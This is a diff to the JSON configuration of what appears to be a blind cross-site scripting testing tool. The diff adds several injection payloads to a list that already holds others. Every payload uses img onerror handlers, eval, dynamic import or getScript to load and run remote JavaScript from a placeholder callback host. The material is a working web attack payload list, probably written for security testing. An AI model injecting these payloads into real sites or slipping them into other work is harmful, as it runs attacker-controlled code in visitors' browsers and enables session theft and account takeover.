@@ -9,7 +9,12 @@
       "true,\u003cscript\u003e$.getScript(\"//{BC}\")\u003c/script\u003e",
       "true,\u003cscript\u003efunction b(){eval(this.responseText)};a\u003dnew XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//{BC}\");a.send();\u003c/script\u003e",
       "true,\"\u003e\u003cscript src\u003dhttp://{BC}\u003e\u003c/script\u003e",
-      "true,javascript:eval(\u0027var a\u003ddocument.createElement(\\\u0027script\\\u0027);a.src\u003d\\\u0027http://{BC}\\\u0027;document.body.appendChild(a)\u0027)"
+      "true,javascript:eval(\u0027var a\u003ddocument.createElement(\\\u0027script\\\u0027);a.src\u003d\\\u0027http://{BC}\\\u0027;document.body.appendChild(a)\u0027)",
+      "true,\u003c\u003chttps:{BC}/onfocus​\u003d1?import(tagName):1 AutoFocus ContentEditable\u003e\u003e",
+      "true,\u003cimg src/onerror\u003d\"fetch(\u0027http:{BC}/index.js\u0027).then((r)\u003d\u003er.text()).then(t\u003d\u003eeval(t))\"\u003e",
+      "true,\u003cimg src/onerror\u003dimport(\u0027https:{BC}\u0027)\u003e",
+      "true,\u003cimg src/onerror\u003d$.getScript(\u0027https:{BC}\u0027)\u003e",
+      "true,\u003cimg src onerror\u003dimport(\u0027//{BC}/\u0027)\u003e"
     ],
     "Encoder": [],
     "UrlEncode": false,
